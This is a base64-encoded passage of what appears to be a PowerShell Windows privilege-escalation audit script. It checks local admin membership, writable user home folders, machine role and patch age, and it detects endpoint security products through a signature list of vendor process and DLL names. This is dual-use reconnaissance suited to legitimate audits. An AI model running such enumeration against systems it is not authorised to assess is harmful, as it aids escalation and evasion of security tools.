BZG1pbkdyb3VwUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgJExvY2FsQWRtaW5Hcm91cFJlc3VsdEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUeXBlIiAtVmFsdWUgJE1lbWJlclR5cGUKICAgICAgICAgICAgICAgICRMb2NhbEFkbWluR3JvdXBSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSXNMb2NhbCIgLVZhbHVlICRNZW1iZXJJc0xvY2FsICAKICAgICAgICAgICAgICAgICRMb2NhbEFkbWluR3JvdXBSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSXNFbmFibGVkIiAtVmFsdWUgJE1lbWJlcklzRW5hYmxlZCAKICAgICAgICAgICAgICAgICRMb2NhbEFkbWluR3JvdXBSZXN1bHRJdGVtCiAgICAgICAgICAgIH0KICAgICAgICB9IAogICAgfSBjYXRjaCB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAkXy5FeGNlcHRpb24KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVVzZXJzSG9tZUZvbGRlckNoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIAogICAgRW51bWVyYXRlcyB0aGUgbG9jYWwgdXNlciBob21lIGZvbGRlcnMuCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBFbnVtZXJhdGVzIHRoZSBmb2xkZXJzIGxvY2F0ZWQgaW4gQzpcVXNlcnNcLiBGb3IgZWFjaCBvbmUsIHRoaXMgZnVuY3Rpb24gY2hlY2tzIHdoZXRoZXIgdGhlIAogICAgZm9sZGVyIGlzIHJlYWRhYmxlIGFuZC9vciB3cml0YWJsZSBieSB0aGUgY3VycmVudCB1c2VyLiAKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1Vc2Vyc0hvbWVGb2xkZXJDaGVjawoKICAgIEhvbWVGb2xkZXJQYXRoICAgICAgICAgUmVhZCBXcml0ZQogICAgLS0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tIC0tLS0tCiAgICBDOlxVc2Vyc1xMYWItQWRtaW4gICAgRmFsc2UgRmFsc2UKICAgIEM6XFVzZXJzXExhYi1Vc2VyICAgICAgVHJ1ZSAgVHJ1ZQogICAgQzpcVXNlcnNcUHVibGljICAgICAgICBUcnVlICBUcnVlCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQogICAgCiAgICAkVXNlcnNIb21lRm9sZGVyID0gSm9pbi1QYXRoIC1QYXRoICQoKEdldC1JdGVtICRlbnY6d2luZGlyKS5Sb290KSAtQ2hpbGRQYXRoIFVzZXJzCgogICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkVXNlcnNIb21lRm9sZGVyIHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAkRm9sZGVyUGF0aCA9ICRfLkZ1bGxOYW1lCiAgICAgICAgJFJlYWRBY2Nlc3MgPSAkRmFsc2UKICAgICAgICAkV3JpdGVBY2Nlc3MgPSAkRmFsc2UKCiAgICAgICAgJE51bGwgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRGb2xkZXJQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEVycm9yR2V0Q2hpbGRJdGVtIAogICAgICAgIGlmICgtbm90ICRFcnJvckdldENoaWxkSXRlbSkgewoKICAgICAgICAgICAgJFJlYWRBY2Nlc3MgPSAkVHJ1ZSAKCiAgICAgICAgICAgICRNb2RpZmlhYmxlUGF0aHMgPSAkRm9sZGVyUGF0aCB8IEdldC1Nb2RpZmlhYmxlUGF0aCAtTGl0ZXJhbFBhdGhzCiAgICAgICAgICAgIGlmICgoW29iamVjdFtdXSRNb2RpZmlhYmxlUGF0aHMpLkxlbmd0aCAtZ3QgMCkgewogICAgICAgICAgICAgICAgJFdyaXRlQWNjZXNzID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJFVzZXJIb21Gb2xkZXJSZXN1bHRJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgJFVzZXJIb21Gb2xkZXJSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSG9tZUZvbGRlclBhdGgiIC1WYWx1ZSAkRm9sZGVyUGF0aAogICAgICAgICRVc2VySG9tRm9sZGVyUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlYWQiIC1WYWx1ZSAkUmVhZEFjY2VzcwogICAgICAgICRVc2VySG9tRm9sZGVyUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIldyaXRlIiAtVmFsdWUgJFdyaXRlQWNjZXNzCiAgICAgICAgJFVzZXJIb21Gb2xkZXJSZXN1bHRJdGVtCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1NYWNoaW5lUm9sZUNoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBHZXRzIHRoZSByb2xlIG9mIHRoZSBtYWNoaW5lICh3b3Jrc3RhdGlvbiwgc2VydmVyLCBkb21haW4gY29udHJvbGxlcikKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoZSByb2xlIG9mIHRoZSBtYWNoaW5lIGNhbiBiZSBjaGVja2VkIGJ5IHJlYWRpbmcgdGhlIGZvbGxvd2luZyByZWdpc3RyeSBrZXk6CiAgICBIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcUHJvZHVjdE9wdGlvbnMKICAgIFRoZSAiUHJvZHVjdFR5cGUiIHZhbHVlIHJlcHJlc2VudHMgdGhlIHJvbGUgb2YgdGhlIG1hY2hpbmUuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtTWFjaGluZVJvbGVDaGVjawoKICAgIE5hbWUgIFJvbGUgICAgICAgCiAgICAtLS0tICAtLS0tICAgICAgIAogICAgV2luTlQgV29ya1N0YXRpb24KICAgIAogICAgLk5PVEVTCgogICAgV2luTlQgPSB3b3Jrc3RhdGlvbgogICAgTGFubWFuTlQgPSBkb21haW4gY29udHJvbGxlcgogICAgU2VydmVyTlQgPSBzZXJ2ZXIKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJE1hY2hpbmVSb2xlUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCgogICAgJEl0ZW0gPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6SEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFByb2R1Y3RPcHRpb25zIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBHZXRJdGVtUHJvcGVydHlFcnJvcgogICAgCiAgICAkRnJpZW5kbHlOYW1lcyA9IEB7CiAgICAgICAgIldpbk5UIiA9ICJXb3JrU3RhdGlvbiI7CiAgICAgICAgIkxhbm1hbk5UIiA9ICJEb21haW4gQ29udHJvbGxlciI7CiAgICAgICAgIlNlcnZlck5UIiA9ICJTZXJ2ZXIiOwogICAgfQoKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcil7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJE1hY2hpbmVSb2xlUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAgICAgJE1hY2hpbmVSb2xlUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRJdGVtLlByb2R1Y3RUeXBlCiAgICAgICAgICAgICRNYWNoaW5lUm9sZVJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJvbGUiIC1WYWx1ZSAkRnJpZW5kbHlOYW1lc1skSXRlbS5Qcm9kdWN0VHlwZV0KICAgICAgICAgICAgJE1hY2hpbmVSb2xlUmVzdWx0IAogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJIYXNodGFibGUgZXJyb3IuIgogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVdpbmRvd3NVcGRhdGVDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgR2V0cyB0aGUgbGFzdCB1cGRhdGUgdGltZSBvZiB0aGUgbWFjaGluZS4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoZSBXaW5kb3dzIFVwZGF0ZSBzdGF0dXMgY2FuIGJlIHF1ZXJpZWQgdGhhbmtzIHRvIHRoZSBNaWNyb3NvZnQuVXBkYXRlLkF1dG9VcGRhdGUgQ09NIG9iamVjdC4KICAgIEl0IGdpdmVzIHRoZSBsYXN0IHN1Y2Nlc3NmdWwgc2VhcmNoIHRpbWUgYW5kIHRoZSBsYXN0IHN1Y2Nlc3NmdWxsIHVwZGF0ZSBpbnN0YWxsYXRpb24gdGltZS4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEludm9rZS1XaW5kb3dzVXBkYXRlQ2hlY2sKCiAgICBUaW1lCiAgICAtLS0tCiAgICAyMDIwLTAxLTEyIC0gMDk6MTc6MzcKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgdHJ5IHsKICAgICAgICAkV2luZG93c1VwZGF0ZSA9IChOZXctT2JqZWN0IC1Db21PYmplY3QgIk1pY3Jvc29mdC5VcGRhdGUuQXV0b1VwZGF0ZSIpLlJlc3VsdHMKCiAgICAgICAgaWYgKCRXaW5kb3dzVXBkYXRlLkxhc3RJbnN0YWxsYXRpb25TdWNjZXNzRGF0ZSkgewogICAgICAgICAgICAkV2luZG93c1VwZGF0ZVJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAkV2luZG93c1VwZGF0ZVJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlRpbWUiIC1WYWx1ZSAkKENvbnZlcnQtRGF0ZVRvU3RyaW5nIC1EYXRlICRXaW5kb3dzVXBkYXRlLkxhc3RJbnN0YWxsYXRpb25TdWNjZXNzRGF0ZSkKICAgICAgICAgICAgJFdpbmRvd3NVcGRhdGVSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUaW1lUmF3IiAtVmFsdWUgJFdpbmRvd3NVcGRhdGUuTGFzdEluc3RhbGxhdGlvblN1Y2Nlc3NEYXRlCiAgICAgICAgICAgICRXaW5kb3dzVXBkYXRlUmVzdWx0CiAgICAgICAgfSAKICAgIH0gY2F0Y2ggewogICAgICAgICMgV2UgbWlnaHQgZ2V0IGFuIGFjY2VzcyBkZW5pZWQgd2hlbiBxdWVyeWluZyB0aGlzIENPTSBvYmplY3QKICAgICAgICBXcml0ZS1WZXJib3NlICJFcnJvciB3aGlsZSByZXF1ZXN0aW5nIENPTSBvYmplY3QgTWljcm9zb2Z0LlVwZGF0ZS5BdXRvVXBkYXRlLiIKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUhvdEZpeENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBHZXRzIGEgbGlzdCBvZiBpbnN0YWxsZWQgdXBkYXRlcyBhbmQgaG90Zml4ZXMuCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgY2hlY2sgc2ltcGx5IGludm9rZXMgdGhlIGhlbHBlciBmdW5jdGlvbiAnR2V0LUhvdEZpeExpc3QnIGFuZCBzb3J0cyB0aGUgcmVzdWx0cyBmcm9tIHRoZQogICAgbmV3ZXN0IHRvIHRoZSBvbGRlc3QuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtSG90Rml4Q2hlY2sKCiAgICBIb3RGaXhJRCAgRGVzY3JpcHRpb24gICAgIEluc3RhbGxlZEJ5ICAgICAgICAgICBJbnN0YWxsZWRPbgogICAgLS0tLS0tLS0gIC0tLS0tLS0tLS0tICAgICAtLS0tLS0tLS0tLSAgICAgICAgICAgLS0tLS0tLS0tLS0KICAgIEtCNDU3ODk2OCBVcGRhdGUgICAgICAgICAgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMTAtMTQgMTg6MDY6MTgKICAgIEtCNDU4MDMyNSBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMTAtMTQgMTM6MDk6MzcKICAgIEtCNDU3NzI2NiBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDktMTEgMTM6Mzc6NTkKICAgIEtCNDU3MDMzNCBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDgtMTMgMTc6NDU6MzQKICAgIEtCNDU2Njc4NSBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDctMTYgMTM6MDg6MTQKICAgIEtCNDU2MTYwMCBTZWN1cml0eSBVcGRhdGUgTlQgQVVUSE9SSVRZXFNZU1RFTSAgIDIwMjAtMDYtMjIgMTM6MDA6NTAKICAgIEtCNDU2MDM2NiBTZWN1cml0eSBVcGRhdGUgREVTS1RPUC03QTBBS1FJXGFkbWluIDIwMjAtMDYtMjIgMTI6NDA6MzkKICAgIEtCNDUzNzc1OSBTZWN1cml0eSBVcGRhdGUgICAgICAgICAgICAgICAgICAgICAgIDIwMjAtMDUtMTEgMDc6NDQ6MTQKICAgIEtCNDU1Nzk2OCBTZWN1cml0eSBVcGRhdGUgICAgICAgICAgICAgICAgICAgICAgIDIwMjAtMDUtMTEgMDc6Mzc6MDkKCiAgICAjPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKCkKCiAgICBHZXQtSG90Rml4TGlzdCB8IFNvcnQtT2JqZWN0IC1Qcm9wZXJ0eSAiSW5zdGFsbGVkT24iIC1EZXNjZW5kaW5nCn0KCmZ1bmN0aW9uIEludm9rZS1Ib3RGaXhWdWxuQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyB3aGV0aGVyIGFueSBob3RmaXggaGFzIGJlZW4gaW5zdGFsbGVkIGluIHRoZSBsYXN0IDMxIGRheXMuCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgc2NyaXB0IGZpcnN0IGxpc3RzIGFsbCB0aGUgaW5zdGFsbGVkIGhvdGZpeGVzLiBJZiBubyByZXN1bHQgaXMgcmV0dXJuZWQsIHRoaXMgd2lsbCBiZQogICAgcmVwb3J0ZWQgYXMgYSBmaW5kaW5nLiBJZiBhdCBsZWFzdCBvbmUgcmVzdWx0IGlzIHJldHVybmVkLCB0aGUgc2NyaXB0IHdpbGwgY2hlY2sgdGhlIGZpcnN0IAogICAgb25lICh3aGljaCBjb3JyZXNwb25kcyB0byB0aGUgbGF0ZXN0IGhvdGZpeCkuIElmIGl0J3MgbW9yZSB0aGFuIDMxIGRheXMgb2xkLCBpdCB3aWxsIGJlIAogICAgcmV0dXJuZWQuCiAgICAKICAgIC5FWEFNUExFCgogICAgQW4gZXhhbXBsZQoKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQoKICAgICRIb3RmaXhlcyA9IEdldC1Ib3RGaXhMaXN0IHwgU29ydC1PYmplY3QgLVByb3BlcnR5ICJJbnN0YWxsZWRPbiIgLURlc2NlbmRpbmcKCiAgICBpZiAoJCgoW29iamVjdFtdXSRIb3RmaXhlcykuTGVuZ3RoKSAtZ3QgMCkgewoKICAgICAgICAkTGF0ZXN0SG90Zml4ID0gJEhvdGZpeGVzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgICAgICRUaW1lU3BhbiA9IE5ldy1UaW1lU3BhbiAtU3RhcnQgJExhdGVzdEhvdGZpeC5JbnN0YWxsZWRPbiAtRW5kICQoR2V0LURhdGUpCgogICAgICAgIGlmICgkVGltZVNwYW4uVG90YWxEYXlzIC1ndCAzMSkgewogICAgICAgICAgICAkTGF0ZXN0SG90Zml4CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQXQgbGVhc3Qgb25lIGhvdGZpeCB3YXMgaW5zdGFsbGVkIGluIHRoZSBsYXN0IDMxIGRheXMuIgogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhlIGhvdGZpeCBoaXN0b3J5IGlzIGVtcHR5LiIKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLUVuZHBvaW50UHJvdGVjdGlvbkNoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIAogICAgR2V0cyBhIGxpc3Qgb2Ygc2VjdXJpdHkgc29mdHdhcmUgcHJvZHVjdHMgCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgY2hlY2sgd2FzIGluc3BpcmVkIGJ5IHRoZSBzY3JpcHQgSW52b2tlLUVEUkNoZWNrZXIucHMxIChQd25EZXh0ZXIpLiBJdCBlbnVtZXJhdGVzIHRoZSBETExzCiAgICB0aGF0IGFyZSBsb2FkZWQgaW4gdGhlIGN1cnJlbnQgcHJvY2VzcywgdGhlIHByb2Nlc3NlcyB0aGF0IGFyZSBjdXJyZW50bHkgcnVubmluZywgdGhlIGluc3RhbGxlZAogICAgYXBwbGljYXRpb25zIGFuZCB0aGUgaW5zdGFsbGVkIHNlcnZpY2VzLiBGb3IgZWFjaCBvbmUgb2YgdGhlc2UgZW50cmllcywgaXQgZXh0cmFjdHMgc29tZSAKICAgIG1ldGFkYXRhIGFuZCBjaGVja3Mgd2hldGhlciBpdCBjb250YWlucyBzb21lIGtub3duIHN0cmluZ3MgcmVsYXRlZCB0byBhIGdpdmVuIHNlY3VyaXR5IHNvZnR3YXJlCiAgICBwcm9kdWN0LiBJZiB0aGVyZSBpcyBhIG1hdGNoLCB0aGUgY29ycmVzcG9uZGluZyBlbnRyeSBpcyByZXR1cm5lZCBhbG9uZyB3aXRoIHRoZSBkYXRhIHRoYXQgd2FzCiAgICBtYXRjaGVkLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLUVuZHBvaW50UHJvdGVjdGlvbkNoZWNrCgogICAgUHJvZHVjdE5hbWUgICAgICBTb3VyY2UgICAgICAgICAgICAgICAgUGF0dGVybgogICAgLS0tLS0tLS0tLS0gICAgICAtLS0tLS0gICAgICAgICAgICAgICAgLS0tLS0tLQogICAgQU1TSSAgICAgICAgICAgICBMb2FkZWQgRExMICAgICAgICAgICAgRmlsZU5hbWU9QzpcV2luZG93c1xTWVNURU0zMlxhbXNpLmRsbAogICAgQU1TSSAgICAgICAgICAgICBMb2FkZWQgRExMICAgICAgICAgICAgSW50ZXJuYWxOYW1lPWFtc2kuZGxsCiAgICBBTVNJICAgICAgICAgICAgIExvYWRlZCBETEwgICAgICAgICAgICBPcmlnaW5hbEZpbGVuYW1lPWFtc2kuZGxsCiAgICBXaW5kb3dzIERlZmVuZGVyIExvYWRlZCBETEwgICAgICAgICAgICBGaWxlTmFtZT1DOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxwbGF0Zm9ybVw0LjE4LjIwMDguOS0wXE1wT2F2LmRsbAogICAgV2luZG93cyBEZWZlbmRlciBMb2FkZWQgRExMICAgICAgICAgICAgRmlsZU5hbWU9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJccGxhdGZvcm1cNC4xOC4yMDA4LjktMFxNUENMSUVOVC5ETEwKICAgIFdpbmRvd3MgRGVmZW5kZXIgUnVubmluZyBwcm9jZXNzICAgICAgIFByb2Nlc3NOYW1lPU1zTXBFbmcKICAgIFdpbmRvd3MgRGVmZW5kZXIgUnVubmluZyBwcm9jZXNzICAgICAgIE5hbWU9TXNNcEVuZwogICAgV2luZG93cyBEZWZlbmRlciBSdW5uaW5nIHByb2Nlc3MgICAgICAgUHJvY2Vzc05hbWU9TmlzU3J2CiAgICBXaW5kb3dzIERlZmVuZGVyIFJ1bm5pbmcgcHJvY2VzcyAgICAgICBOYW1lPU5pc1NydgogICAgV2luZG93cyBEZWZlbmRlciBSdW5uaW5nIHByb2Nlc3MgICAgICAgUHJvY2Vzc05hbWU9U2VjdXJpdHlIZWFsdGhTZXJ2aWNlCiAgICBXaW5kb3dzIERlZmVuZGVyIFJ1bm5pbmcgcHJvY2VzcyAgICAgICBOYW1lPVNlY3VyaXR5SGVhbHRoU2VydmljZQogICAgV2luZG93cyBEZWZlbmRlciBSdW5uaW5nIHByb2Nlc3MgICAgICAgRGVzY3JpcHRpb249V2luZG93cyBEZWZlbmRlciBTbWFydFNjcmVlbgogICAgV2luZG93cyBEZWZlbmRlciBJbnN0YWxsZWQgYXBwbGljYXRpb24gTmFtZT1XaW5kb3dzIERlZmVuZGVyCiAgICBXaW5kb3dzIERlZmVuZGVyIEluc3RhbGxlZCBhcHBsaWNhdGlvbiBOYW1lPVdpbmRvd3MgRGVmZW5kZXIKICAgIFdpbmRvd3MgRGVmZW5kZXIgSW5zdGFsbGVkIGFwcGxpY2F0aW9uIE5hbWU9V2luZG93cyBEZWZlbmRlciBBZHZhbmNlZCBUaHJlYXQgUHJvdGVjdGlvbgogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgTmFtZT1TZWN1cml0eUhlYWx0aFNlcnZpY2UKICAgIFdpbmRvd3MgRGVmZW5kZXIgU2VydmljZSAgICAgICAgICAgICAgIEltYWdlUGF0aD1DOlxXaW5kb3dzXHN5c3RlbTMyXFNlY3VyaXR5SGVhbHRoU2VydmljZS5leGUKICAgIFdpbmRvd3MgRGVmZW5kZXIgU2VydmljZSAgICAgICAgICAgICAgIFJlZ2lzdHJ5S2V5PUhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcU2VjdXJpdHlIZWFsdGhTZXJ2aWNlCiAgICBXaW5kb3dzIERlZmVuZGVyIFNlcnZpY2UgICAgICAgICAgICAgICBSZWdpc3RyeVBhdGg9TWljcm9zb2Z0LlBvd2VyU2hlbGwuQ29yZVxSZWdpc3RyeTo6SEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTZWN1cml0eUhlYWx0aFNlcnZpY2UKICAgIFdpbmRvd3MgRGVmZW5kZXIgU2VydmljZSAgICAgICAgICAgICAgIERpc3BsYXlOYW1lPUBDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXIgQWR2YW5jZWQgVGhyZWF0IFByb3RlY3Rpb25cTXNTZW5zZS5leGUsLTEwMDEKICAgIFdpbmRvd3MgRGVmZW5kZXIgU2VydmljZSAgICAgICAgICAgICAgIEltYWdlUGF0aD0iQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyIEFkdmFuY2VkIFRocmVhdCBQcm90ZWN0aW9uXE1zU2Vuc2UuZXhlIgogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgRGlzcGxheU5hbWU9QEM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNcEFzRGVzYy5kbGwsLTM5MAogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgRGlzcGxheU5hbWU9QEM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNcEFzRGVzYy5kbGwsLTMzMAogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgRGlzcGxheU5hbWU9QEM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNcEFzRGVzYy5kbGwsLTM3MAogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgRGlzcGxheU5hbWU9QEM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNcEFzRGVzYy5kbGwsLTMyMAogICAgV2luZG93cyBEZWZlbmRlciBTZXJ2aWNlICAgICAgICAgICAgICAgSW1hZ2VQYXRoPSJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxwbGF0Zm9ybVw0LjE4LjIwMDguOS0wXE5pc1Nydi5leGUiCiAgICBXaW5kb3dzIERlZmVuZGVyIFNlcnZpY2UgICAgICAgICAgICAgICBEaXNwbGF5TmFtZT1AQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE1wQXNEZXNjLmRsbCwtMzEwCiAgICBXaW5kb3dzIERlZmVuZGVyIFNlcnZpY2UgICAgICAgICAgICAgICBJbWFnZVBhdGg9IkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXHBsYXRmb3JtXDQuMTguMjAwOC45LTBcTXNNcEVuZy5leGUiCiAgICAKICAgIC5OT1RFUwoKICAgIENyZWRpdCBnb2VzIHRvIFB3bkRleHRlcjogaHR0cHM6Ly9naXRodWIuY29tL1B3bkRleHRlci9JbnZva2UtRURSQ2hlY2tlcgogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJFNpZ25hdHVyZXMgPSBAewogICAgICAgICJBTVNJIiAgICAgICAgICAgICAgICAgICAgICAgICAgPSAiYW1zaS5kbGwiCiAgICAgICAgIkFwcFNlbnNlIiAgICAgICAgICAgICAgICAgICAgICA9ICJlbWNvcmVzZXJ2aWNlLGVtc3lzdGVtLHdhdGNoZG9nYWdlbnQiCiAgICAgICAgIkF2YXN0IiAgICAgICAgICAgICAgICAgICAgICAgICA9ICJhdmFzdCIKICAgICAgICAiQXZlY3RvIERlZmVuZHBvaW50IiAgICAgICAgICAgID0gImF2ZWN0byxkZWZlbmRwb2ludCxwZ2Vwb3NlcnZpY2UscGdzeXN0ZW10cmF5LHByaXZpbGVnZWd1YXJkIgogICAgICAgICJDYXJib24gQmxhY2siICAgICAgICAgICAgICAgICAgPSAiY2FyYm9uLGNiLmV4ZSxsb2dyaHl0aG0iCiAgICAgICAgIkNpc2NvIEFNUCIgICAgICAgICAgICAgICAgICAgICA9ICJjaXNjb2FtcCIKICAgICAgICAiQ291bnRlclRhY2siICAgICAgICAgICAgICAgICAgID0gImNvdW50ZXJ0YWNrIgogICAgICAgICJDcm93ZFN0cmlrZSIgICAgICAgICAgICAgICAgICAgPSAiY3Jvd2RzdHJpa2UsY3NhZ2VudCxjc2ZhbGNvbixjc3NoZWxsLHdpbmRvd3NzZW5zb3IiCiAgICAgICAgIkN5YmVyZWFzb24iICAgICAgICAgICAgICAgICAgICA9ICJhY3RpdmVjb25zb2xlLGNyYW10cmF5LGNyc3N2YyxjeWJlcmVhc29uIgogICAgICAgICJDeWxhbmNlIiAgICAgICAgICAgICAgICAgICAgICAgPSAiY3lsYW5jZSxjeW9wdGljcyxjeXVwZGF0ZSIKICAgICAgICAiRW5kZ2FtZSIgICAgICAgICAgICAgICAgICAgICAgID0gImVuZGdhbWUiCiAgICAgICAgIkVTRVQgRW5kcG9pbnQgSW5zcGVjdG9yIiAgICAgICA9ICJpbnNwZWN0b3IiCiAgICAgICAgImVUcnVzdCBFWiBBViIgICAgICAgICAgICAgICAgICA9ICJncm91bmRsaW5nIgogICAgICAgICJGaXJlRXllIiAgICAgICAgICAgICAgICAgICAgICAgPSAiZmlyZWV5ZSxtYW5kaWFudCx4YWd0IgogICAgICAgICJGb3JlU2NvdXQiICAgICAgICAgICAgICAgICAgICAgPSAiZm9yZXNjb3V0LHNlY3VyZWNvbm5lY3RvciIKICAgICAgICAiSUJNIFFSYWRhciIgICAgICAgICAgICAgICAgICAgID0gInFyYWRhcix3aW5jb2xsZWN0IgogICAgICAgICJJdmFudGkiICAgICAgICAgICAgICAgICAgICAgICAgPSAiaXZhbnRpIgogI